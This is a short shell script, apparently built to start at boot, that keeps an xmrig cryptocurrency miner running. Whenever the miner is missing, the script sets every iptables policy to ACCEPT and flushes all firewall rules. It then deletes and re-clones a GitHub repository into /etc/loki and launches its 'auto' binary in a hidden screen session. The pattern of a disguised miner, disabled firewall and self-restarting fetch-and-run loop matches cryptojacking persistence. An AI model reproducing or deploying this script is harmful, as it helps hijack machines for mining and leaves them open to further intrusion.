#!/bin/sh
#mv autorun.bash to /etc/init.d/ #update-rc.d autorun.bash defaults
# run it$ bash autorun.bash & disown
sudo sysctl -w vm.nr_hugepages=1280
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
timeout=7200
while true
do
#iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
if [[ ! $(pgrep xmrig) ]]; then
cd /etc/loki/
screen -S work -d -m bash -c "./auto"
sleep 15
if [[ ! $(pgrep xmrig) ]]; then
cd /etc/
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
service iptables save
rm -rf loki/
git clone https://github.com/legevole/loki.git
cd loki/
awk '$1=$1' FS="#" OFS="iip" config >>config.json
chmod +x auto
screen -S work -d -m bash -c "./auto"
fi
fi
sleep $timeout
done
